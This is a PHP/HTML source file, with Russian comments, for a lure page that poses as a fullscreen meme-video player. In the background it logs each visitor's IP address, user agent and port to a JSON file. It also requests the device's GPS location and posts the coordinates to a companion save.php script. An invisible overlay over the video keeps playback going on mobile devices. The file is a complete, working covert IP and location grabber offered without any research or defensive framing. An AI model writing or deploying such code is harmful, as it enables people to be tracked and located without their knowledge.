<?php
// index.php
session_start();

// Установка временной зоны Узбекистана (Ташкент)
date_default_timezone_set('Asia/Tashkent');

function getRealIP() {
    $ip_keys = ['HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'REMOTE_ADDR'];
    foreach ($ip_keys as $key) {
        if (!empty($_SERVER[$key])) {
            foreach (explode(',', $_SERVER[$key]) as $ip) {
                $ip = trim($ip);
                if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false) {
                    return $ip;
                }
            }
            if (filter_var($_SERVER[$key], FILTER_VALIDATE_IP) !== false) {
                return $_SERVER[$key];
            }
        }
    }
    return $_SERVER['REMOTE_ADDR'] ?? 'Не определен';
}

$ip = getRealIP();
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Не определен';
$request_time = date('Y-m-d H:i:s');
$protocol = $_SERVER['SERVER_PROTOCOL'] ?? '';
$port = $_SERVER['REMOTE_PORT'] ?? '';

// Список 100% открытых для мобильных устройств юмор-мемов
$videos = [
    'dQw4w9WgXcQ', // Рикролл
    'QH2-TGUlwu4', // Панда
    'tntOCGkgt98', // Поющий кот
    'FzRH3iWPPr4'  // Фейлы
];
$random_video = $videos[array_rand($videos)];

$log_entry = [
    'id' => uniqid(),
    'time' => $request_time,
    'ip' => $ip,
    'user_agent' => $user_agent,
    'protocol' => $protocol,
    'port' => $port,
    'lat' => 'Доступ отклонен или ожидается',
    'lon' => 'Доступ отклонен или ожидается'
];

$_SESSION['current_log_id'] = $log_entry['id'];

$file = 'logs.json';
$current_data = file_exists($file) ? json_decode(file_get_contents($file), true) : [];
if (!is_array($current_data)) $current_data = [];
$current_data[$log_entry['id']] = $log_entry;
file_put_contents($file, json_encode($current_data, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT));
?>
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Воспроизведение...</title>
    <style>
        html, body {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            background-color: #000;
            overflow: hidden;
            position: relative;
        }
        .fullscreen-video {
            position: absolute;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            border: none;
            z-index: 1;
        }
        /* Невидимый прозрачный слой поверх видео для обхода блокировок клика на смартфонах */
        .mobile-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 2;
            cursor: pointer;
            background: rgba(0,0,0,0.01);
        }
    </style>
</head>
<body>

<div class="mobile-overlay" id="overlay"></div>

<iframe 
    id="player"
    class="fullscreen-video"
    src="https://www.youtube.com/embed/<?php echo $random_video; ?>?autoplay=1&mute=1&loop=1&playlist=<?php echo $random_video; ?>&controls=1&rel=0&playsinline=1" 
    allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
    allowfullscreen>
</iframe>

<script>
// Принудительный старт для мобильных при любом тапе по экрану
document.getElementById('overlay').addEventListener('click', function() {
    const player = document.getElementById('player');
    // Обновляем src для обхода жесткой политики автозапуска Apple/Android
    player.src = player.src + "&start=0";
    this.style.display = 'none'; // Убираем слой после клика
});

// Запрос геопозиции
if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(function(position) {
        const data = new FormData();
        data.append('lat', position.coords.latitude);
        data.append('lon', position.coords.longitude);

        fetch('save.php', {
            method: 'POST',
            body: data
        });
    }, function(error) {
        console.log("Доступ к геопозиции отклонен мобильным устройством.");
    });
}
</script>
</body>
</html>